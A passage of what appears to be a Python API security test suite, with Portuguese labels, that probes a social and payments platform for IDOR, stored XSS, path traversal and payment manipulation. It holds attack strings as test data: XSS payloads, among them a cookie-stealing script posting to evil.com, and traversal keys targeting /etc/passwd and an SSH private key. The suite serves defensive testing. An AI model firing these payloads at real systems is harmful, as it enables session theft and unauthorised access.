    # C06-09: Get comments
    tid += 1
    r = GET(s, base, f"/posts/{FAKE_UUID}/comments")
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "GET comments de post aleatorio",
                       "INFO", "PASS",
                       f"Comments: {r.status_code}"))

    # C06-10: Post comment with XSS payloads
    tid += 1
    xss_payloads = [
        "<script>alert('XSS')</script>",
        '<img src=x onerror="alert(1)">',
        "javascript:alert(1)//",
        '"><svg onload=alert(1)>',
    ]
    xss_stored = False
    for payload in xss_payloads:
        r = POST(s, base, f"/posts/{FAKE_UUID}/comments", {"content": payload})
        if is_success(r):
            d = _safe_json(r)
            stored = d.get("data", {}).get("content", "")
            if "<script>" in stored or "onerror" in stored or "onload" in stored:
                xss_stored = True
                break
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Comentario com XSS payload",
                       "HIGH", "FAIL" if xss_stored else "PASS",
                       "XSS armazenado em comentario!" if xss_stored else
                       "XSS sanitizado ou rejeitado nos comentarios",
                       recommendation="Sanitizar HTML em todos os campos de texto"))

    # C06-11: Report post with injection
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/report", {
        "reason": "spam", "description": "<script>alert(1)</script> OR 1=1--"
    })
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Report post com injection",
                       "MEDIUM", "PASS",
                       f"Report: {r.status_code}"))

    # C06-12: Track view
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/view", {})
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Track view em post aleatorio",
                       "INFO", "PASS",
                       f"View track: {r.status_code}"))

    # C06-13: Share post
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/share", {})
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Share post aleatorio",
                       "INFO", "PASS",
                       f"Share: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 7: IDOR â€” MESSAGES (8 tests)
# ##############################################################################

def test_cat07_messages(s, base, rpt, uid):
    """Test IDOR and abuse on messaging endpoints."""
    hdr("CAT 07: IDOR \u2014 Messages")
    t0 = time.time()
    cat = "07-IDOR-Messages"
    tid = 0

    # C07-01: List own conversations
    tid += 1
    r = GET(s, base, "/messages/conversations")
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "GET /messages/conversations",
                       "INFO", "PASS",
                       f"Conversations: {r.status_code}"))

    # C07-02: Self-message
    tid += 1
    r = POST(s, base, "/messages/conversations", {"recipientId": uid})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "Criar conversa consigo mesmo",
                       "MEDIUM", "FAIL" if accepted else "PASS",
                       "Self-message permitido!" if accepted else
                       f"Self-message bloqueado ({r.status_code})",
                       recommendation="Bloquear criacao de conversa com si mesmo"))

    # C07-03: Create conversation with random user
    tid += 1
    r = POST(s, base, "/messages/conversations", {"recipientId": FAKE_UUID, "content": "pentest message"})
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "Criar conversa com usuario aleatorio",
                       "INFO", "PASS",
                       f"New conversation: {r.status_code}"))

    # C07-04: Read random conversation (IDOR)
    tid += 1
    r = GET(s, base, f"/messages/conversations/{FAKE_UUID}/messages")
    d = _safe_json(r)
    idor = False
    if is_success(r):
        messages = d.get("data", {}).get("messages", d.get("data", []))
        if isinstance(messages, list) and len(messages) > 0:
            foreign = [m for m in messages
                       if m.get("senderId") != uid and m.get("recipientId") != uid]
            if foreign:
                idor = True
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "Ler conversa alheia (IDOR)",
                       "CRITICAL", "FAIL" if idor else "PASS",
                       "IDOR: leu mensagens de conversa alheia!" if idor else
                       f"Conversa alheia inacessivel ({r.status_code})",
                       recommendation="Verificar que usuario eh participante da conversa"))

    # C07-05: Send message to random conversation (IDOR)
    tid += 1
    r = POST(s, base, f"/messages/conversations/{FAKE_UUID}/messages", {"content": "pentest idor"})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "Enviar msg em conversa alheia (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Enviou mensagem em conversa alheia!" if accepted else
                       f"Envio IDOR bloqueado ({r.status_code})"))

    # C07-06: XSS in message content
    tid += 1
    xss_payload = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
    r = POST(s, base, f"/messages/conversations/{FAKE_UUID}/messages", {"content": xss_payload})
    xss_stored = False
    if is_success(r):
        d = _safe_json(r)
        stored = d.get("data", {}).get("content", "")
        if "<script>" in stored:
            xss_stored = True
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "XSS em mensagem",
                       "HIGH", "FAIL" if xss_stored else "PASS",
                       "XSS armazenado em mensagem!" if xss_stored else
                       "XSS sanitizado/rejeitado em mensagens",
                       recommendation="Sanitizar HTML em conteudo de mensagens"))

    # C07-07: Mark random conversation as read
    tid += 1
    r = PATCH(s, base, f"/messages/conversations/{FAKE_UUID}/read", {})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "Marcar conversa alheia como lida",
                       "MEDIUM", "FAIL" if accepted else "PASS",
                       "Marcou conversa alheia como lida!" if accepted else
                       f"Mark-read IDOR bloqueado ({r.status_code})"))

    # C07-08: Unread count
    tid += 1
    r = GET(s, base, "/messages/unread-count")
    rpt.add(TestResult(cat, f"C07-{tid:02d}", "GET /messages/unread-count",
                       "INFO", "PASS",
                       f"Unread count: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 8: IDOR â€” NOTIFICATIONS (5 tests)
# ##############################################################################

def test_cat08_notifications(s, base, rpt):
    """Test IDOR on notification endpoints."""
    hdr("CAT 08: IDOR \u2014 Notifications")
    t0 = time.time()
    cat = "08-IDOR-Notifications"
    tid = 0

    # C08-01: List own notifications
    tid += 1
    r = GET(s, base, "/notifications")
    rpt.add(TestResult(cat, f"C08-{tid:02d}", "GET /notifications",
                       "INFO", "PASS",
                       f"Notifications: {r.status_code}"))

    # C08-02: Unread count
    tid += 1
    r = GET(s, base, "/notifications/unread-count")
    rpt.add(TestResult(cat, f"C08-{tid:02d}", "GET /notifications/unread-count",
                       "INFO", "PASS",
                       f"Unread count: {r.status_code}"))

    # C08-03: Mark random notification as read (IDOR)
    tid += 1
    r = PATCH(s, base, f"/notifications/{FAKE_UUID}/read", {})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C08-{tid:02d}", "Marcar notificacao alheia como lida",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Marcou notificacao alheia como lida!" if accepted else
                       f"Mark-read IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership da notificacao"))

    # C08-04: Delete random notification (IDOR)
    tid += 1
    r = DELETE(s, base, f"/notifications/{FAKE_UUID}")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C08-{tid:02d}", "Deletar notificacao alheia (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Deletou notificacao de outro!" if accepted else
                       f"Delete IDOR bloqueado ({r.status_code})"))

    # C08-05: Mark all as read
    tid += 1
    r = POST(s, base, "/notifications/read-all", {})
    rpt.add(TestResult(cat, f"C08-{tid:02d}", "POST /notifications/read-all",
                       "INFO", "PASS",
                       f"Read-all: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 9: IDOR â€” UPLOADS & MEDIA (6 tests)
# ##############################################################################

def test_cat09_uploads_media(s, base, rpt):
    """Test upload IDOR, path traversal, and malicious filenames."""
    hdr("CAT 09: IDOR \u2014 Uploads & Media")
    t0 = time.time()
    cat = "09-IDOR-Uploads"
    tid = 0

    # C09-01: Upload avatar with malicious filename (script injection)
    tid += 1
    try:
        files = {"file": ("<script>alert(1)</script>.jpg", b"\xff\xd8\xff\xe0fake", "image/jpeg")}
        # We need to temporarily remove Content-Type for multipart
        ct = s.headers.pop("Content-Type", None)
        r = s.post(f"{base}/upload/avatar", files=files, timeout=10)
        if ct:
            s.headers["Content-Type"] = ct
        d = _safe_json(r)
        malicious_name = False
        if is_success(r):
            url = d.get("data", {}).get("url", "")
            if "<script>" in url:
                malicious_name = True
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload avatar com filename malicioso",
                           "HIGH", "FAIL" if malicious_name else "PASS",
                           "Filename malicioso preservado na URL!" if malicious_name else
                           f"Upload avatar: {r.status_code}",
                           recommendation="Sanitizar nomes de arquivo e gerar UUID para storage"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload avatar com filename malicioso",
                           "HIGH", "PASS",
                           f"Upload rejeitado/erro: {str(e)[:100]}"))

    # C09-02: Upload cover with oversized content
    tid += 1
    try:
        oversized = b"\xff\xd8\xff\xe0" + b"A" * (11 * 1024 * 1024)  # ~11MB
        files = {"file": ("cover.jpg", oversized, "image/jpeg")}
        ct = s.headers.pop("Content-Type", None)
        r = s.post(f"{base}/upload/cover", files=files, timeout=30)
        if ct:
            s.headers["Content-Type"] = ct
        blocked = r.status_code in (400, 413, 422)
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload cover oversized (11MB)",
                           "MEDIUM", "PASS" if blocked else "WARN",
                           f"Oversized upload: {r.status_code}",
                           recommendation="Limitar tamanho de upload (ex: 5MB)"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload cover oversized (11MB)",
                           "MEDIUM", "PASS",
                           f"Oversized rejeitado: {str(e)[:100]}"))

    # C09-03: Path traversal in delete
    tid += 1
    r = DELETE(s, base, "/upload/../../etc/passwd")
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C09-{tid:02d}", "Path traversal em DELETE upload",
                       "CRITICAL", "PASS" if blocked else "FAIL",
                       "Path traversal bloqueado" if blocked else
                       "Path traversal aceito no delete!",
                       recommendation="Sanitizar paths e bloquear ../ em URLs"))

    # C09-04: Delete other user's avatar (IDOR)
    tid += 1
    r = DELETE(s, base, f"/upload/avatars/{FAKE_UUID}/photo.jpg")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C09-{tid:02d}", "Deletar avatar de outro usuario",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Deletou avatar de outro!" if accepted else
                       f"Delete IDOR bloqueado ({r.status_code})"))

    # C09-05: Upload to another user's post (IDOR)
    tid += 1
    try:
        files = {"file": ("test.jpg", b"\xff\xd8\xff\xe0fake", "image/jpeg")}
        ct = s.headers.pop("Content-Type", None)
        r = s.post(f"{base}/upload/post/{FAKE_UUID}/media", files=files, timeout=10)
        if ct:
            s.headers["Content-Type"] = ct
        accepted = is_success(r)
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload media em post alheio (IDOR)",
                           "HIGH", "FAIL" if accepted else "PASS",
                           "Upload em post alheio aceito!" if accepted else
                           f"Upload IDOR bloqueado ({r.status_code})"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload media em post alheio (IDOR)",
                           "HIGH", "PASS",
                           f"Upload rejeitado: {str(e)[:100]}"))

    # C09-06: Upload message media
    tid += 1
    try:
        files = {"file": ("msg.jpg", b"\xff\xd8\xff\xe0fake", "image/jpeg")}
        ct = s.headers.pop("Content-Type", None)
        r = s.post(f"{base}/upload/message", files=files, timeout=10)
        if ct:
            s.headers["Content-Type"] = ct
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload message media",
                           "INFO", "PASS",
                           f"Message media upload: {r.status_code}"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C09-{tid:02d}", "Upload message media",
                           "INFO", "PASS",
                           f"Upload: {str(e)[:100]}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 10: KYC SECURITY (5 tests)
# ##############################################################################

def test_cat10_kyc_security(s, base, rpt):
    """Test KYC document security and IDOR."""
    hdr("CAT 10: KYC Security")
    t0 = time.time()
    cat = "10-KYC-Security"
    tid = 0

    # C10-01: Own KYC status
    tid += 1
    r = GET(s, base, "/kyc/status")
    rpt.add(TestResult(cat, f"C10-{tid:02d}", "GET /kyc/status (proprio)",
                       "INFO", "PASS",
                       f"KYC status: {r.status_code}"))

    # C10-02: IDOR â€” try to get another user's KYC
    tid += 1
    r = GET(s, base, f"/kyc/status?userId={FAKE_UUID}")
    idor = False
    if is_success(r):
        d = _safe_json(r)
        data = d.get("data", {})
        if data.get("userId") == FAKE_UUID:
            idor = True
    rpt.add(TestResult(cat, f"C10-{tid:02d}", "IDOR: KYC status de outro usuario",
                       "HIGH", "FAIL" if idor else "PASS",
                       "KYC de outro usuario acessivel!" if idor else
                       f"KYC IDOR bloqueado ({r.status_code})",
                       recommendation="Ignorar userId do query param, usar do token"))

    # C10-03: Submit KYC with path traversal in document keys
    tid += 1
    r = POST(s, base, "/kyc/submit", {
        "fullName": "Pentest User",
        "documentType": "cpf",
        "documentNumber": "12345678901",
        "documentFrontKey": "../../etc/passwd",
        "documentBackKey": "../../../admin/secrets",
        "selfieKey": "../../../../root/.ssh/id_rsa",
    })
    d = _safe_json(r)
    traversal = False
    if is_success(r):
        data = d.get("data", {})
        keys = [data.get("documentFrontKey", ""), data.get("documentBackKey", "")]
        if any("../" in k for k in keys):
            traversal = True
    rpt.add(TestResult(cat, f"C10-{tid:02d}", "KYC submit com path traversal",
                       "HIGH", "FAIL" if traversal else "PASS",
                       "Path traversal preservado nos document keys!" if traversal else
                       f"KYC path traversal tratado ({r.status_code})",
                       recommendation="Validar que document keys correspondem a uploads reais"))

    # C10-04: Submit KYC with XSS in fields
    tid += 1
    r = POST(s, base, "/kyc/submit", {
        "fullName": '<script>alert("xss")</script>',
        "documentType": "cpf",
        "documentNumber": "12345678901",
        "documentFrontKey": "legit-key-front",
        "documentBackKey": "legit-key-back",
        "selfieKey": '<img onerror=alert(1) src=x>',
    })
    rpt.add(TestResult(cat, f"C10-{tid:02d}", "KYC submit com XSS em campos",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"KYC XSS: {r.status_code}",
                       recommendation="Sanitizar todos os campos de texto no KYC"))

    # C10-05: Submit KYC with invalid document type
    tid += 1
    r = POST(s, base, "/kyc/submit", {
        "fullName": "Pentest User",
        "documentType": "INVALID_TYPE_XYZ",
        "documentNumber": "12345678901",
        "documentFrontKey": "key-front",
        "documentBackKey": "key-back",
        "selfieKey": "key-selfie",
    })
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C10-{tid:02d}", "KYC submit com tipo de documento invalido",
                       "MEDIUM", "PASS" if blocked else "WARN",
                       f"Invalid doc type: {r.status_code}",
                       recommendation="Validar documentType contra enum de tipos validos"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 11: GAMIFICATION ABUSE (5 tests)
# ##############################################################################

def test_cat11_gamification(s, base, rpt):
    """Test gamification abuse: double check-in, XP injection."""
    hdr("CAT 11: Gamification Abuse")
    t0 = time.time()
    cat = "11-Gamification"
    tid = 0

    # C11-01: Own gamification profile
    tid += 1
    r = GET(s, base, "/gamification/me")
    rpt.add(TestResult(cat, f"C11-{tid:02d}", "GET /gamification/me",
                       "INFO", "PASS",
                       f"Gamification profile: {r.status_code}"))

    # C11-02: Daily check-in (first)
    tid += 1
    r1 = POST(s, base, "/gamification/checkin", {})
    d1 = _safe_json(r1)
    rpt.add(TestResult(cat, f"C11-{tid:02d}", "Check-in diario (primeiro)",
                       "INFO", "PASS",
                       f"First checkin: {r1.status_code}"))

    # C11-03: Double check-in (should be blocked)
    tid += 1
    r2 = POST(s, base, "/gamification/checkin", {})
    d2 = _safe_json(r2)
    double_accepted = False
    if is_success(r2):
        data = d2.get("data", {})
        if not data.get("alreadyCheckedIn") and data.get("xpAwarded", -1) != 0:
            double_accepted = True
    rpt.add(TestResult(cat, f"C11-{tid:02d}", "Double check-in (deve ser bloqueado)",
                       "MEDIUM", "FAIL" if double_accepted else "PASS",
                       "Double check-in deu XP duplicado!" if double_accepted else
                       f"Double check-in protegido ({r2.status_code})",
                       recommendation="Verificar ultimo checkin por dia no backend"))

    # C11-04: XP injection via body
    tid += 1
    r = POST(s, base, "/gamification/checkin", {"xp": 999999, "tier": "diamond", "level": 100})
    d = _safe_json(r)
    injected = False
    if is_success(r):
        data = d.get("data", {})
        if data.get("xp", 0) >= 999999 or data.get("tier") == "diamond":
            injected = True
    rpt.add(TestResult(cat, f"C11-{tid:02d}", "XP injection via body",
                       "HIGH", "FAIL" if injected else "PASS",
                       "XP/tier injetado com sucesso!" if injected else
                       "XP definido server-side (body ignorado)",
                       recommendation="Ignorar campos de XP/tier do request body"))

    # C11-05: View missions
    tid += 1
    r = GET(s, base, "/gamification/missions")
    rpt.add(TestResult(cat, f"C11-{tid:02d}", "GET /gamification/missions",
                       "INFO", "PASS",
                       f"Missions: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 12: PAYMENT MANIPULATION (8 tests)
# ##############################################################################

def test_cat12_payment_manipulation(s, base, rpt):
    """Test payment endpoints for manipulation, negative amounts, IDOR."""
    hdr("CAT 12: Payment Manipulation")
    t0 = time.time()
    cat = "12-Payments"
    tid = 0

    # C12-01: Checkout with fake package
    tid += 1
    r = POST(s, base, "/payments/checkout/fancoins", {"packageId": FAKE_UUID})
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Checkout com pacote inexistente",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Fake package checkout: {r.status_code}"))

    # C12-02: Custom checkout negative amount
    tid += 1
    r = POST(s, base, "/payments/checkout/fancoins/custom", {"amountBrl": -100})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Checkout custom negativo (-100)",
                       "CRITICAL", "FAIL" if accepted else "PASS",
                       "Pagamento negativo aceito!" if accepted else
                       f"Valor negativo rejeitado ({r.status_code})",
                       recommendation="Validar amountBrl > 0"))

    # C12-03: Custom checkout zero
    tid += 1
    r = POST(s, base, "/payments/checkout/fancoins/custom", {"amountBrl": 0})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Checkout custom zero (0)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Pagamento zero aceito!" if accepted else
                       f"Zero rejeitado ({r.status_code})"))

    # C12-04: Custom checkout tiny (0.01)
    tid += 1
    r = POST(s, base, "/payments/checkout/fancoins/custom", {"amountBrl": 0.01})
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Checkout custom minimo (0.01)",
                       "LOW", "PASS",
                       f"Tiny checkout: {r.status_code}"))

    # C12-05: Custom checkout huge
    tid += 1
    r = POST(s, base, "/payments/checkout/fancoins/custom", {"amountBrl": 99999999})
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Checkout custom enorme (99999999)",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Huge checkout: {r.status_code}",
                       recommendation="Definir limite maximo por transacao"))

    # C12-06: Check random payment status (IDOR)
    tid += 1
    r = GET(s, base, f"/payments/status/{FAKE_UUID}")
    idor = False
    if is_success(r):
        d = _safe_json(r)
        data = d.get("data", {})
        # If it returns payment data for a fake UUID, it might be leaking
        if data.get("id") or data.get("status"):
            idor = True
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "Status de pagamento alheio (IDOR)",
                       "HIGH", "FAIL" if idor else "PASS",
                       "Dados de pagamento alheio acessiveis!" if idor else
                       f"Payment IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership do payment"))

    # C12-07: PayPal capture with fake IDs
    tid += 1
    r = POST(s, base, "/payments/paypal/capture", {"orderId": "FAKE_ORDER_123", "paymentId": FAKE_UUID})
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "PayPal capture com IDs falsos",
                       "HIGH", "PASS" if is_blocked(r) else "WARN",
                       f"Fake PayPal capture: {r.status_code}",
                       recommendation="Validar orderId com PayPal API antes de creditar"))

    # C12-08: PPV checkout
    tid += 1
    r = POST(s, base, "/payments/checkout/ppv", {"postId": FAKE_UUID})
    rpt.add(TestResult(cat, f"C12-{tid:02d}", "PPV checkout com postId aleatorio",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"PPV checkout: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 13: GUILDS & COMMUNITIES (6 tests)
# ##############################################################################

def test_cat13_guilds(s, base, rpt):
    """Test guild IDOR and unauthorized modifications."""
    hdr("CAT 13: Guilds & Communities")
    t0 = time.time()
    cat = "13-Guilds"
    tid = 0

    # C13-01: List guilds
    tid += 1
    r = GET(s, base, "/guilds")
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "GET /guilds",
                       "INFO", "PASS",
                       f"List guilds: {r.status_code}"))

    # C13-02: Get random guild
    tid += 1
    r = GET(s, base, f"/guilds/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "GET guild aleatoria",
                       "INFO", "PASS",
                       f"Random guild: {r.status_code}"))

    # C13-03: Join random guild
    tid += 1
    r = POST(s, base, f"/guilds/{FAKE_UUID}/join", {})
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "Entrar em guild aleatoria",
                       "INFO", "PASS",
                       f"Join guild: {r.status_code}"))

    # C13-04: Leave random guild
    tid += 1
    r = POST(s, base, f"/guilds/{FAKE_UUID}/leave", {})
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "Sair de guild aleatoria",
                       "INFO", "PASS",
                       f"Leave guild: {r.status_code}"))

    # C13-05: Update random guild (IDOR)
    tid += 1
    r = PATCH(s, base, f"/guilds/{FAKE_UUID}", {"name": "hacked-guild", "description": "pwned"})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "Atualizar guild alheia (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Atualizou guild de outro!" if accepted else
                       f"Guild update IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership da guild"))

    # C13-06: Subscribe to guild
    tid += 1
    r = POST(s, base, f"/guilds/{FAKE_UUID}/subscribe", {})
    rpt.add(TestResult(cat, f"C13-{tid:02d}", "Subscribe em guild aleatoria",
                       "INFO", "PASS",
                       f"Guild subscribe: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 14: PITCH/CROWDFUNDING (6 tests)
# ##############################################################################

def test_cat14_pitch_crowdfunding(s, base, rpt):
    """Test pitch/crowdfunding abuse: negative contributions, out-of-bounds ratings."""
    hdr("CAT 14: Pitch / Crowdfunding")
    t0 = time.time()
    cat = "14-Pitch"
    tid = 0

    # C14-01: List campaigns
    tid += 1
    r = GET(s, base, "/pitch/campaigns")
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "GET /pitch/campaigns",
                       "INFO", "PASS",
                       f"Campaigns: {r.status_code}"))

    # C14-02: Get random campaign
    tid += 1
    r = GET(s, base, f"/pitch/campaigns/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "GET campanha aleatoria",
                       "INFO", "PASS",
                       f"Random campaign: {r.status_code}"))

    # C14-03: Negative contribution
    tid += 1
    r = POST(s, base, f"/pitch/campaigns/{FAKE_UUID}/contribute", {"amount": -100})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "Contribuicao negativa (-100)",
                       "CRITICAL", "FAIL" if accepted else "PASS",
                       "Contribuicao negativa aceita!" if accepted else
                       f"Negativo rejeitado ({r.status_code})",
                       recommendation="Validar amount > 0"))

    # C14-04: Zero contribution
    tid += 1
    r = POST(s, base, f"/pitch/campaigns/{FAKE_UUID}/contribute", {"amount": 0})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "Contribuicao zero (0)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Contribuicao zero aceita!" if accepted else
                       f"Zero rejeitado ({r.status_code})"))

    # C14-05: Out-of-bounds ratings
    tid += 1
    oob_results = []
    for rating in [0, -1, 100, 999]:
        r = POST(s, base, f"/pitch/campaigns/{FAKE_UUID}/rate", {"rating": rating})
        if is_success(r):
            oob_results.append(rating)
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "Rating fora dos limites (0, -1, 100, 999)",
                       "MEDIUM", "FAIL" if oob_results else "PASS",
                       f"Ratings aceitos fora do range: {oob_results}" if oob_results else
                       "Ratings fora do range rejeitados",
                       recommendation="Validar rating dentro do range permitido (ex: 1-5)"))

    # C14-06: List own contributions
    tid += 1
    r = GET(s, base, "/pitch/my/contributions")
    rpt.add(TestResult(cat, f"C14-{tid:02d}", "GET /pitch/my/contributions",
                       "INFO", "PASS",
                       f"My contributions: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 15: COMMITMENTS (5 tests)
# ##############################################################################

def test_cat15_commitments(s, base, rpt, uid):
    """Test commitment abuse: negative amounts, self-commit, IDOR withdrawal."""
    hdr("CAT 15: Commitments")
    t0 = time.time()
    cat = "15-Commitments"
    tid = 0

    # C15-01: Get config
    tid += 1
    r = GET(s, base, "/commitments/config")
    rpt.add(TestResult(cat, f"C15-{tid:02d}", "GET /commitments/config",
                       "INFO", "PASS",
                       f"Commitments config: {r.status_code}"))

    # C15-02: Create commitment with negative amount
    tid += 1
    r = POST(s, base, "/commitments", {
        "creatorId": FAKE_UUID, "amount": -100, "durationDays": 30
    })
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C15-{tid:02d}", "Commitment com valor negativo (-100)",
                       "CRITICAL", "FAIL" if accepted else "PASS",
                       "Commitment negativo aceito!" if accepted else
                       f"Negativo rejeitado ({r.status_code})",
                       recommendation="Validar amount > 0"))

    # C15-03: Self-commit
    tid += 1
    r = POST(s, base, "/commitments", {
        "creatorId": uid, "amount": 100, "durationDays": 30
    })
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C15-{tid:02d}", "Self-commitment (comprometer-se consigo mesmo)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Self-commitment aceito!" if accepted else
                       f"Self-commitment bloqueado ({r.status_code})",
                       recommendation="Bloquear commitment onde creatorId == userId"))

    # C15-04: List own commitments
    tid += 1
    r = GET(s, base, "/commitments/my")
    rpt.add(TestResult(cat, f"C15-{tid:02d}", "GET /commitments/my",
                       "INFO", "PASS",
                       f"My commitments: {r.status_code}"))

    # C15-05: Withdraw random commitment (IDOR)
    tid += 1
    r = POST(s, base, f"/commitments/{FAKE_UUID}/withdraw", {})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C15-{tid:02d}", "Withdraw commitment alheio (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Withdraw de commitment alheio aceito!" if accepted else
                       f"Withdraw IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership do commitment"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 16: AFFILIATES (6 tests)
# ##############################################################################

def test_cat16_affiliates(s, base, rpt):
    """Test affiliate IDOR and dashboard access."""
    hdr("CAT 16: Affiliates")
    t0 = time.time()
    cat = "16-Affiliates"
    tid = 0

    # C16-01: Create affiliate link
    tid += 1
    r = POST(s, base, "/affiliates/links", {"creatorId": FAKE_UUID})
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "Criar link de afiliado",
                       "INFO", "PASS",
                       f"Create affiliate link: {r.status_code}"))

    # C16-02: List affiliate links
    tid += 1
    r = GET(s, base, "/affiliates/links")
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "GET /affiliates/links",
                       "INFO", "PASS",
                       f"Affiliate links: {r.status_code}"))

    # C16-03: Own dashboard
    tid += 1
    r = GET(s, base, "/affiliates/dashboard")
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "GET /affiliates/dashboard",
                       "INFO", "PASS",
                       f"Dashboard: {r.status_code}"))

    # C16-04: IDOR â€” access another user's affiliate dashboard
    tid += 1
    r = GET(s, base, f"/affiliates/dashboard?userId={FAKE_UUID}")
    idor = False
    if is_success(r):
        d = _safe_json(r)
        data = d.get("data", {})
        if data.get("userId") == FAKE_UUID:
            idor = True
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "IDOR: dashboard de outro afiliado",
                       "HIGH", "FAIL" if idor else "PASS",
                       "Dashboard de outro afiliado acessivel!" if idor else
                       f"Dashboard IDOR bloqueado ({r.status_code})",
                       recommendation="Ignorar userId do query param, usar do token"))

    # C16-05: Get bonus info
    tid += 1
    r = GET(s, base, "/affiliates/bonus")
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "GET /affiliates/bonus",
                       "INFO", "PASS",
                       f"Affiliate bonus: {r.status_code}"))

    # C16-06: Claim bonus
    tid += 1
    r = POST(s, base, "/affiliates/bonus/claim", {})
    rpt.add(TestResult(cat, f"C16-{tid:02d}", "Claim bonus de afiliado",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Bonus claim: {r.status_code}",
                       recommendation="Validar elegibilidade antes de conceder bonus"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 17: OTP/PLATFORM SECURITY (6 tests)
# ##############################################################################

def test_cat17_otp_platform(s, base, rpt):
    """Test OTP security, platform documents, brute force."""
    hdr("CAT 17: OTP / Platform Security")
    t0 = time.time()
    cat = "17-OTP-Platform"
    tid = 0

    # C17-01: Request OTP for withdrawal
    tid += 1
    r = POST(s, base, "/platform/otp/request", {"purpose": "withdrawal"})
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "Solicitar OTP para withdrawal",
                       "INFO", "PASS",
                       f"OTP request: {r.status_code}"))

